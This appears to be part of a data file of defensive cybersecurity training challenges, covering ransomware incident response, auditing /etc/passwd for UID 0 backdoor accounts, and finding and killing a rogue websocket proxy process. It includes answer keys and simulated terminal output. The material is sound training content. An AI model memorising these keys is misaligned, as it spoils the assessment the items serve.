    hint: 'Isolate the host immediately',
    educationalNote: 'When ransomware is detected actively encrypting files, the priority is network isolation to prevent lateral spread. Shutting down the host destroys volatile memory evidence needed for forensic analysis and decryption key recovery.',
    payload: {
      question: 'Active ransomware encryption detected on a database server. Files are being encrypted in real-time. The server holds live customer transaction data. What is the BEST immediate response?',
      options: [
        { text: 'Immediately shut down the server to stop encryption', isCorrect: false, feedback: 'Shutting down destroys volatile memory that may contain the encryption key. You lose forensic evidence and any chance of key recovery.' },
        { text: 'Isolate the host from the network, capture memory dump, then assess', isCorrect: true },
        { text: 'Attempt to kill the ransomware process and restore from backup', isCorrect: false, feedback: 'Killing the process without isolation allows lateral movement to continue. Other hosts may already be compromised.' },
        { text: 'Pay the ransom demand immediately to minimize data loss', isCorrect: false, feedback: 'Never pay ransom as first response. It funds criminal operations and there is no guarantee of decryption. Isolate and assess first.' },
      ],
    },
  },
  {
    id: 'cli-linux-uid0',
    tier: 2,
    verb: 'AUDIT ROOT ACCOUNTS!',
    engine: 'CLI_EXEC',
    timeLimitMs: 14000,
    category: 'Linux',
    hint: 'awk -F: to find UID 0 accounts',
    educationalNote: 'Attackers create stealth backdoor accounts with UID 0 in /etc/passwd to gain persistent root access. Regularly auditing for unauthorized UID 0 entries is a critical CCDC defensive check.',
    payload: { prompt: 'root@server:~#', successCommands: ['awk -F: \'($3 == 0) {print}\' /etc/passwd', 'awk -F: \'$3 == 0\' /etc/passwd', 'grep \':0:\' /etc/passwd', 'cat /etc/passwd | grep \':0:\''] },
  },
  {
    id: 'multi-hunt-websocket',
    tier: 3,
    category: 'Linux',
    educationalNote: 'Attackers use non-standard ports to run covert websocket proxies for C2 communication. Detecting unusual listening ports with ss/netstat and terminating the rogue PID is a critical incident response skill.',
    stages: [
      {
        verb: 'FIND ROGUE PORT!',
        engine: 'CLI_EXEC',
        timeLimitMs: 12000,
        hint: 'ss -tulnp or netstat -tulnp',
        payload: { prompt: 'root@web:~#', successCommands: ['ss -tulnp', 'ss -tulnp | grep LISTEN', 'netstat -tulnp', 'netstat -tulnp | grep LISTEN'], simulatedOutput: 'State  Recv-Q  Send-Q  Local:Port  Peer:Port  Process\nLISTEN 0       128     0.0.0.0:8443   0.0.0.0:*     users:(("ws-proxy",pid=31337,fd=3))' },
      },
      {
        verb: 'KILL ROGUE PROXY!',
        engine: 'CLI_EXEC',
        timeLimitMs: 10000,
        hint: 'kill -9 31337',
        payload: { prompt: 'root@web:~#', successCommands: ['kill -9 31337', 'kill 31337', 'pkill ws-proxy', 'pkill -9 ws-proxy'] },
      },
    ],
  },
];
